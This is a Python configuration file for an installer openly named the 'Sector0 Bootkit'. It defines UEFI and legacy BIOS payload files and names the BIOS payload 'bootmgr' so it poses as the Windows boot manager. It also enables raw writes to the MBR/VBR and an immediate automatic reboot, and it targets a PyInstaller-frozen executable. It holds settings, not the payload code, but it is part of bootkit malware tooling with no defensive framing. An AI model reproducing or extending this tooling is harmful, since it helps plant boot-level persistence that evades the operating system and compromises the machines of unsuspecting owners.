"""
Sector0 Bootkit - Configuration
===================================
All configurable constants for the bootkit installer.
"""

import os
import sys

# =============================================================================
# PATH CONFIGURATION
# =============================================================================

if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

PAYLOADS_DIR = os.path.join(BASE_DIR, "payloads")
LOG_FILE = os.path.join(BASE_DIR, "installer.log")

# =============================================================================
# UEFI CONFIGURATION
# =============================================================================

UEFI_PAYLOAD_BINARY = "BOOTX64.efi"
UEFI_EFI_PATH = r"\EFI\BOOT"
UEFI_BOOT_ENTRY_NAME = "Sector0"

# =============================================================================
# LEGACY BIOS CONFIGURATION
# =============================================================================

BIOS_PAYLOAD_BINARY = "bootloader.bin"
BIOS_TARGET_FILENAME = "bootmgr"  # What to name the payload on target

# =============================================================================
# INSTALLER BEHAVIOR
# =============================================================================

# Auto-reboot after successful installation
AUTO_REBOOT = True
REBOOT_DELAY_SECONDS = 0

# Create backup of original bootmgr
BACKUP_ORIGINAL = True

# Write directly to MBR/VBR (raw disk access)
WRITE_RAW_SECTORS = True

# =============================================================================
# CONSOLE CONFIGURATION
# =============================================================================

# Allocate console window for frozen executables (PyInstaller)
ALLOC_CONSOLE = True

# Enable verbose logging
VERBOSE = True
